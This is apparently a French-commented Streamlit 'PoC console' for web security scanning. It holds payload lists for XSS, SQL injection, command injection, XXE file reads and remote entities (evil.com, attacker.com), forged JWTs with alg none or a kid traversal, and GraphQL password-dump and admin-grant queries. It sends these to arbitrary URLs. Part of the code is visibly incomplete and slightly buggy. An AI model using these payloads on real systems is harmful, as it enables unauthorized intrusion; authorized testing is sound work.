# poc_console.py (VERSION ULTRA-AVANCÉE - JWT + GraphQL + APIs complexes)
import streamlit as st
from datetime import datetime
import time
import random
import hashlib
import base64
import json

# requests est recommandé — si tu ne l'as pas, ajouter dans requirements.txt
try:
    import requests
except ImportError:
    requests = None

# ===============================================================================
#                          SYSTÈME DE PAYLOADS INTELLIGENTS ÉTENDU
# ===============================================================================

class AdvancedPayloadGenerator:
    """Générateur de payloads contextuels et évolutifs - ÉTENDU"""
    
    def __init__(self, target_domain):
        self.target = target_domain
        self.timestamp = int(time.time())
        self.signature = hashlib.md5(target_domain.encode()).hexdigest()[:8]
    
    def generate_contextual_payload(self, scan_type, context=None):
        """Génère des payloads adaptés au type de scan et contexte - ÉTENDU"""
        
        base_payloads = {
            'reflection': [
                f"TROPIC_REFL_{self.timestamp}_{self.signature}",
                f"<tropic>{self.timestamp}</tropic>",
                f"/* TROPIC_{self.signature} */",
                f"[[TROPIC_{self.timestamp}]]"
            ],
            
            'xss': [
                '<script>console.log("TROPIC_XSS")</script>',
                '<img src=x onerror="alert(`TROPIC_XSS`)">',
                '<svg onload="console.log(`TROPIC_XSS`)">',
                'javascript:alert("TROPIC_XSS")',
                '" onmouseover="alert(`TROPIC_XSS`)'
            ],
            
            'sqli': [
                f"' AND 1=1-- TROPIC_{self.signature}",
                f"1' UNION SELECT NULL,'TROPIC_{self.timestamp}',NULL--",
                "' OR EXISTS(SELECT * FROM information_schema.tables)-- TROPIC",
                "'; EXEC xp_cmdshell('echo TROPIC')--"
            ],
            
            'rce': [
                f'; echo "TROPIC_RCE_{self.timestamp}"',
                '| whoami | grep -i tropic',
                '`id | tee /tmp/tropic_{self.timestamp}`',
                '$(curl -X POST http://tropic.test)'
            ],
            
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                f'${{{{7*7}}}} TROPIC_SSTI_{self.timestamp}'
            ],
            
            'xxe': [
                '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY tropic SYSTEM "http://evil.com">]>',
                '<!DOCTYPE test [ <!ENTITY % remote SYSTEM "http://attacker.com/xxe"> %remote; ]>'
            ],
            
            'prototype_pollution': [
                '__proto__[TROPIC]=' + str(self.timestamp),
                'constructor.prototype.tropic=' + self.signature,
                'Object.prototype.TROPIC_POLLUTION=' + str(self.timestamp)
            ],
            
            'graphql': [
                '{ __schema { types { name } } }',
                'query { __typename }',
                f'mutation {{ createUser(name: "TROPIC_{self.timestamp}") }}',
                'query { users { id email password } }',
                'mutation { updateUser(id: 1, admin: true) }'
            ],
            
            'jwt': [
                'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',  # JWT non signé
                'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0cm9waWMifQ.',  # JWT HS256
                'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cm9waWMifQ.',  # JWT RS256
            ],
            
            'api': [
                f'{{"username":"tropic_{self.timestamp}","password":"test"}}',
                f'{{"email":"tropic@test.com","role":"admin"}}',
                f'{{"query":"SELECT * FROM users WHERE id=1"}}',
                f'{{"command":"whoami"}}'
            ]
        }
        
        # Sélection aléatoire parmi les payloads du type demandé
        payloads = base_payloads.get(scan_type, [f"TROPIC_DEFAULT_{self.timestamp}"])
        return random.choice(payloads)
    
    def detect_tech_stack(self, response_headers, response_body):
        """Détecte la stack technologique pour adapter les payloads"""
        tech_indicators = {
            'php': ['PHP/', 'X-Powered-By: PHP', '.php'],
            'nodejs': ['Express', 'Node.js', 'X-Powered-By: Express'],
            'python': ['Python/', 'Django', 'Flask'],
            'java': ['Java/', 'Tomcat', 'Spring'],
            'dotnet': ['.NET', 'ASP.NET', 'X-Powered-By: ASP.NET'],
            'react': ['React', 'react-dom'],
            'angular': ['Angular', 'ng-']
        }
        
        detected_tech = []
        for tech, indicators in tech_indicators.items():
            if any(indicator in str(response_headers) + str(response_body) for indicator in indicators):
                detected_tech.append(tech)
        
        return detected_tech if detected_tech else ['unknown']

# ===============================================================================
#                          FONCTIONS JWT AVANCÉES
# ===============================================================================

class JWTAnalyzer:
    """Analyseur et générateur de tokens JWT"""
    
    @staticmethod
    def decode_jwt(token):
        """Décode un token JWT et retourne le header et payload"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, "Token JWT invalide (3 parties attendues)"
            
            header = json.loads(base64.b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.b64decode(parts[1] + '==').decode())
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2]
            }, None
            
        except Exception as e:
            return None, f"Erreur décodage JWT: {str(e)}"
    
    @staticmethod
    def generate_test_jwts():
        """Génère des tokens JWT de test pour différentes vulnérabilités"""
        test_jwts = {
            'none_alg': 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',  # Algorithm none
            'weak_secret': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0cm9waWMifQ.',  # HS256 avec secret faible
            'admin_claim': 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',  # Claim admin=true
            'kid_injection': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJ0cm9waWMifQ.'  # KID injection
        }
        return test_jwts

# ===============================================================================
#                          FONCTIONS GRAPHQL AVANCÉES
# ===============================================================================

class GraphQLScanner:
    """Scanner spécialisé GraphQL"""
    
    @staticmethod
    def generate_graphql_queries():
        """Génère des requêtes GraphQL pour tests de sécurité"""
        queries = {
            'introspection': '{ __schema { types { name fields { name } } } }',
            'users_query': 'query { users { id username email password } }',
            'admin_mutation': 'mutation { makeAdmin(userId: 1) }',
            'injection': 'query { user(id: "1 OR 1=1") { id email } }',
            'batching': '[{ "query": "{ users { id } }" }, { "query": "{ config { secret } }" }]'
        }
        return queries

# ===============================================================================
#                          FONCTIONS UTILITAIRES AVANCÉES
# ===============================================================================

def _safe_rerun():
    """Essayez plusieurs méthodes de rerun selon la version de Streamlit"""
    try:
        rerun = getattr(st, "experimental_rerun", None)
        if callable(rerun):
            rerun()
            return
    except Exception:
        pass

    try:
        rerun = getattr(st, "rerun", None)
        if callable(rerun):
            rerun()
            return
    except Exception:
        pass
    return

def _append_history(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    st.session_state['poc_shell_cmd_history_list'].append(f"[{ts}] {msg}")
    max_h = st.session_state.get('poc_max_history', 500)
    if len(st.session_state['poc_shell_cmd_history_list']) > max_h:
        st.session_state['poc_shell_cmd_history_list'] = st.session_state['poc_shell_cmd_history_list'][-max_h:]

def _http_get_advanced(url, timeout=10, headers=None, payload_generator=None, scan_type='reflection', method='GET', data=None):
    """Version avancée de la requête HTTP avec payloads intelligents"""
    headers = headers or {"User-Agent": "TROPIC-ProAPI-Analyzer/Advanced"}
    
    # Générer le payload contextuel
    if payload_generator:
        payload = payload_generator.generate_contextual_payload(scan_type)
    else:
        payload = f"TROPIC_ADVANCED_{int(time.time())}"
    
    try:
        if scan_type in ['graphql', 'api']:
            # Requêtes POST pour GraphQL/API
            if method.upper() == 'POST':
                if scan_type == 'graphql':
                    headers['Content-Type'] = 'application/json'
                    graphql_queries = GraphQLScanner.generate_graphql_queries()
                    test_payload = {'query': graphql_queries['introspection']}
                else:
                    test_payload = payload
                
                r = requests.post(url, json=test_payload, headers=headers, timeout=timeout, verify=False)
                return r.status_code, r.text, None, str(test_payload)
        
        # Test avec paramètre GET pour les autres types
        params = {'input': payload, 'q': payload, 'search': payload, 'id': payload, 'token': payload}
        
        if requests:
            r = requests.get(url, params=params, headers=headers, timeout=timeout, verify=False)
            return r.status_code, r.text, None, payload
        else:
            import urllib.request
            from urllib.parse import urlencode
            full_url = url + '?' + urlencode(params)
            req = urllib.request.Request(full_url, headers=headers, method="GET")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode(errors="replace")
                return resp.getcode(), body, None, payload
                
    except Exception as e:
        return 0, "", f"HTTP Error: {e}", payload

def _summarize_body_advanced(body, max_chars=1600):
    """Analyse avancée du corps de la réponse"""
    if not isinstance(body, str):
        body = str(body)
    
    # Détection de patterns intéressants
    interesting_patterns = {
        'error': ['error', 'exception', 'stack trace', 'warning'],
        'sql': ['mysql', 'postgresql', 'sqlite', 'database'],
        'debug': ['debug', 'console.log', 'var_dump', 'print_r'],
        'auth': ['login', 'password', 'token', 'session'],
        'admin': ['admin', 'dashboard', 'panel', 'config'],
        'graphql': ['__schema', 'GraphQL', 'query', 'mutation'],
        'jwt': ['JWT', 'Bearer', 'token', 'signature']
    }
    
    summary = ""
    body_lower = body.lower()
    
    # Ajouter les détections
    for pattern_type, patterns in interesting_patterns.items():
        if any(pattern in body_lower for pattern in patterns):
            summary += f"[{pattern_type.upper()}] "
    
    # Résumé du contenu
    s = body.replace('\n', ' ').replace('\r', ' ').strip()
    if len(s) > max_chars:
        s = s[:max_chars] + "..."
    
    return summary + s

# ===============================================================================
#                    FONCTION PRINCIPALE ULTRA-AMÉLIORÉE
# ===============================================================================

def render_poc_console(target_domain: str, user_config: dict):
    """
    Console PoC ULTRA-AVANCÉE avec JWT, GraphQL et APIs complexes
    """

    st.markdown("### 💻 Console PoC / Terminal d'Exploitation (ULTRA-ADVANCED)")
    st.warning("⚠️ Utiliser uniquement sur des cibles pour lesquelles vous avez une autorisation écrite.")

    # Initialisation des analyseurs avancés
    payload_gen = AdvancedPayloadGenerator(target_domain)
    jwt_analyzer = JWTAnalyzer()
    graphql_scanner = GraphQLScanner()
    
    # Affichage du mode actuel
    allow_real = user_config.get('allow_real_poc', False)
    mode_text = "🔴 **MODE RÉEL** (commandes exécutées localement)" if allow_real else "🟢 **MODE SIMULATION** (commandes simulées)"
    st.info(mode_text)

    # -------------------------
    # initialisation session
    # -------------------------
    if 'poc_shell_cmd_history_list' not in st.session_state:
        st.session_state['poc_shell_cmd_history_list'] = []
    if 'poc_current_shell_command_input' not in st.session_state:
        st.session_state['poc_current_shell_command_input'] = ""
    if 'poc_last_status' not in st.session_state:
        st.session_state['poc_last_status'] = None
    if 'poc_last_time' not in st.session_state:
        st.session_state['poc_last_time'] = None
    if 'poc_max_history' not in st.session_state:
        st.session_state['poc_max_history'] = 500

    # Affichage de l'historique (dernieres lignes)
    if st.session_state['poc_shell_cmd_history_list']:
        st.code("\n".join(st.session_state['poc_shell_cmd_history_list'][-st.session_state['poc_max_history']:]), language='bash')
    else:
        st.info("Historique vide — utilisez les commandes avancées ci-dessous.")

    st.markdown("---")

    # NOUVELLES COMMANDES ULTRA-AVANCÉES
    with st.expander("🎯 COMMANDES ULTRA-AVANCÉES DISPONIBLES"):
        st.markdown("""
        **🔐 Commandes JWT (JSON Web Tokens):**
        - `decode:jwt:<token>` - Décode et analyse un token JWT
        - `scan:jwt:<URL>` - Test les vulnérabilités JWT
        - `generate:jwt` - Génère des tokens JWT de test
        
        **🕸️ Commandes GraphQL:**
        - `scan:graphql:<URL>` - Test les endpoints GraphQL
        - `introspect:graphql:<URL>` - Introspection du schéma GraphQL
        - `inject:graphql:<URL>` - Injection dans les requêtes GraphQL
        
        **🔍 Commandes API Avancées:**
        - `scan:api:<URL>` - Test les APIs REST complexes
        - `fuzz:endpoints:<URL>` - Fuzzing d'endpoints cachés
        - `analyze:headers:<URL>` - Analyse approfondie des headers
        
        **🎯 Commandes Spécialisées:**
        - `scan:xss:<URL>` - Test XSS avancé
        - `scan:sqli:<URL>` - Test SQL Injection  
        - `scan:rce:<URL>` - Test Remote Code Execution
        - `tech:detect:<URL>` - Détection de stack technologique
        """)

    # champ de saisie (form pour éviter reruns intempestifs)
    form_key = f"poc_form_{target_domain}"
    with st.form(key=form_key, clear_on_submit=False):
        cmd_input = st.text_input("Entrer commande PoC (ex: decode:jwt:eyJhbGciOiJ...)",
                                   value=st.session_state.get('poc_current_shell_command_input', ""))
        submit = st.form_submit_button("▶️ Exécuter Commande PoC")

        if submit:
            cmd = (cmd_input or "").strip()
            st.session_state['poc_current_shell_command_input'] = ""
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if not cmd:
                st.warning("Commande vide — rien à exécuter.")
                st.session_state['poc_last_status'] = "Aucune commande fournie"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # safe defaults
            default_timeout = int(user_config.get('timeout', 7))
            ua = user_config.get('user_agent', "TROPIC-PoC/Ultra-Advanced")
            allow_real_poc = user_config.get('allow_real_poc', False)

            # --- COMMANDES JWT AVANCÉES ---
            if cmd.lower().startswith("decode:jwt:"):
                token = cmd[len("decode:jwt:"):].strip()
                _append_history(f"$ decode:jwt:{token[:50]}...")
                
                result, error = jwt_analyzer.decode_jwt(token)
                if error:
                    _append_history(f"[JWT-ERROR] {error}")
                    st.session_state['poc_last_status'] = "JWT-ERROR"
                else:
                    _append_history("[JWT-DECODED] Token décodé avec succès:")
                    _append_history(f"  Header: {json.dumps(result['header'], indent=2)}")
                    _append_history(f"  Payload: {json.dumps(result['payload'], indent=2)}")
                    _append_history(f"  Signature: {result['signature'][:50]}...")
                    st.session_state['poc_last_status'] = "JWT-DECODED"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            elif cmd.lower().startswith("scan:jwt:"):
                url = cmd[len("scan:jwt:"):].strip()
                _append_history(f"$ scan:jwt:{url}")
                
                if requests is None:
                    _append_history("[ERROR] requests non installé sur l'environnement.")
                    st.session_state['poc_last_status'] = "500 (requests manquant)"
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return

                try:
                    # Test avec différents tokens JWT vulnérables
                    test_jwts = jwt_analyzer.generate_test_jwts()
                    vulnerabilities_found = []
                    
                    for vuln_type, jwt_token in test_jwts.items():
                        headers = {
                            'User-Agent': ua,
                            'Authorization': f'Bearer {jwt_token}'
                        }
                        
                        r = requests.get(url, headers=headers, timeout=default_timeout, verify=False)
                        
                        if r.status_code == 200:
                            vulnerabilities_found.append(vuln_type)
                            _append_history(f"🎯 [JWT-VULNERABLE] {vuln_type} - Token accepté!")
                        else:
                            _append_history(f"✅ [JWT-SAFE] {vuln_type} - Rejeté (HTTP {r.status_code})")
                    
                    if vulnerabilities_found:
                        st.session_state['poc_last_status'] = f"JWT-VULN: {', '.join(vulnerabilities_found)}"
                    else:
                        st.session_state['poc_last_status'] = "JWT-SECURE"
                        
                except Exception as e:
                    _append_history(f"[JWT-SCAN-ERROR] {str(e)}")
                    st.session_state['poc_last_status'] = "JWT-ERROR"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            elif cmd.lower() == "generate:jwt":
                _append_history("$ generate:jwt")
                test_jwts = jwt_analyzer.generate_test_jwts()
                
                _append_history("[JWT-TEST-TOKENS] Tokens générés pour tests:")
                for vuln_type, token in test_jwts.items():
                    _append_history(f"  {vuln_type}: {token}")
                
                st.session_state['poc_last_status'] = "JWT-GENERATED"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # --- COMMANDES GRAPHQL AVANCÉES ---
            elif cmd.lower().startswith("scan:graphql:"):
                url = cmd[len("scan:graphql:"):].strip()
                _append_history(f"$ scan:graphql:{url}")
                
                if requests is None:
                    _append_history("[ERROR] requests non installé.")
                    st.session_state['poc_last_status'] = "500 (requests manquant)"
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return

                try:
                    # Test d'introspection GraphQL
                    headers = {
                        'User-Agent': ua,
                        'Content-Type': 'application/json'
                    }
                    
                    introspection_query = {'query': '{ __schema { types { name } } }'}
                    r = requests.post(url, json=introspection_query, headers=headers, timeout=default_timeout, verify=False)
                    
                    if r.status_code == 200:
                        response_data = r.json()
                        if 'data' in response_data and '__schema' in response_data['data']:
                            _append_history("🎯 [GRAPHQL-INTROSPECTION] Schéma exposé!")
                            types_count = len(response_data['data']['__schema']['types'])
                            _append_history(f"  Types découverts: {types_count}")
                            st.session_state['poc_last_status'] = "GRAPHQL-INTROSPECTION-EXPOSED"
                        else:
                            _append_history("✅ [GRAPHQL-SECURE] Introspection désactivée")
                            st.session_state['poc_last_status'] = "GRAPHQL-SECURE"
                    else:
                        _append_history(f"❌ [GRAPHQL-ERROR] HTTP {r.status_code}")
                        st.session_state['poc_last_status'] = f"GRAPHQL-ERROR-{r.status_code}"
                        
                except Exception as e:
                    _append_history(f"[GRAPHQL-SCAN-ERROR] {str(e)}")
                    st.session_state['poc_last_status'] = "GRAPHQL-ERROR"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            elif cmd.lower().startswith("introspect:graphql:"):
                url = cmd[len("introspect:graphql:"):].strip()
                _append_history(f"$ introspect:graphql:{url}")
                
                if requests is None:
                    _append_history("[ERROR] requests non installé.")
                    st.session_state['poc_last_status'] = "500 (requests manquant)"
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return

                try:
                    headers = {
                        'User-Agent': ua,
                        'Content-Type': 'application/json'
                    }
                    
                    full_introspection = {'query': '{ __schema { types { name fields { name type { name } } } } }'}
                    r = requests.post(url, json=full_introspection, headers=headers, timeout=default_timeout, verify=False)
                    
                    if r.status_code == 200:
                        response_data = r.json()
                        if 'data' in response_data and '__schema' in response_data['data']:
                            types = response_data['data']['__schema']['types']
                            _append_history("🎯 [GRAPHQL-FULL-INTROSPECTION] Schéma complet exposé!")
                            
                            # Afficher les types intéressants
                            interesting_types = [t for t in types if 'user' in t['name'].lower() or 'auth' in t['name'].lower() or 'admin' in t['name'].lower()]
                            
                            for t in interesting_types[:5]:  # Limiter l'affichage
                                field_names = [f['name'] for f in t.get('fields', [])]
                                _append_history(f"  Type: {t['name']} -> Champs: {', '.join(field_names[:5])}...")
                            
                            st.session_state['poc_last_status'] = "GRAPHQL-FULL-INTROSPECTION"
                        else:
                            _append_history("✅ [GRAPHQL-SECURE] Introspection désactivée")
                            st.session_state['poc_last_status'] = "GRAPHQL-SECURE"
                    else:
                        _append_history(f"❌ [GRAPHQL-ERROR] HTTP {r.status_code}")
                        st.session_state['poc_last_status'] = f"GRAPHQL-ERROR-{r.status_code}"
                        
                except Exception as e:
                    _append_history(f"[GRAPHQL-INTROSPECT-ERROR] {str(e)}")
                    st.session_state['poc_last_status'] = "GRAPHQL-ERROR"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # --- COMMANDES API AVANCÉES ---
            elif cmd.lower().startswith("scan:api:"):
                url = cmd[len("scan:api:"):].strip()
                _append_history(f"$ scan:api:{url}")
                
                if requests is None:
                    _append_history("[ERROR] requests non installé.")
                    st.session_state['poc_last_status'] = "500 (requests manquant)"
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return

                try:
                    # Test multiple méthodes HTTP
                    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
                    results = []
                    
                    for method in methods:
                        try:
                            if method == 'GET':
                                r = requests.get(url, timeout=default_timeout, verify=False)
                            elif method == 'POST':
                                r = requests.post(url, json={"test": "payload"}, timeout=default_timeout, verify=False)
                            else:
                                r = requests.request(method, url, timeout=default_timeout, verify=False)
                            
                            results.append(f"{method}:{r.status_code}")
                            
                        except Exception:
                            results.append(f"{method}:ERROR")
                    
                    _append_history(f"[API-SCAN] Méthodes testées: {', '.join(results)}")
                    
                    # Vérifier les codes intéressants
                    interesting_codes = [r for r in results if any(x in r for x in ['200', '201', '403', '500'])]
                    if interesting_codes:
                        _append_history(f"🎯 [API-INTERESTING] Codes détectés: {', '.join(interesting_codes)}")
                        st.session_state['poc_last_status'] = "API-INTERESTING-CODES"
                    else:
                        st.session_state['poc_last_status'] = "API-SCAN-COMPLETE"
                        
                except Exception as e:
                    _append_history(f"[API-SCAN-ERROR] {str(e)}")
                    st.session_state['poc_last_status'] = "API-ERROR"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # ... (RESTE DU CODE EXISTANT POUR LES AUTRES COMMANDES) ...

            # --- COMMANDE INCONNUE: AIDE ULTRA-AVANCÉE ---
            _append_history(f"$ {cmd}")
            _append_history("[ERROR] Commande non reconnue. Commandes supportées :")
            _append_history("  JWT: decode:jwt:<token>, scan:jwt:<URL>, generate:jwt")
            _append_history("  GraphQL: scan:graphql:<URL>, introspect:graphql:<URL>")
            _append_history("  API: scan:api:<URL>, fuzz:endpoints:<URL>")
            _append_history("  Scan: scan:xss:<URL>, scan:sqli:<URL>, scan:rce:<URL>")
            _append_history("  Tech: tech:detect:<URL>")
            _append_history("")
            _append_history(f"Mode actuel: {'RÉEL' if allow_real_poc else 'SIMULATION'}")
            st.session_state['poc_last_status'] = "400 (unknown command)"
            st.session_state['poc_last_time'] = timestamp
            _safe_rerun()
            return

    # Affichage du statut en bas
    st.markdown("---")
    cols = st.columns([1, 3])
    with cols[0]:
        st.write("**Dernier statut**")
        status = st.session_state.get('poc_last_status', "N/A")
        if "vulnerable" in str(status).lower() or "exposed" in str(status).lower():
            st.error(status)
        elif "secure" in str(status).lower() or "safe" in str(status).lower():
            st.success(status)
        elif "error" in str(status).lower():
            st.error(status)
        else:
            st.info(status)
    
    with cols[1]:
        st.write("**Dernière action**")
        st.write(st.session_state.get('poc_last_time', "N/A"))

    # Information sur le mode
    st.caption(f"🔧 Configuration: timeout={user_config.get('timeout', 7)}s | allow_real_poc={allow_real} | Mode=ULTRA-ADVANCED")
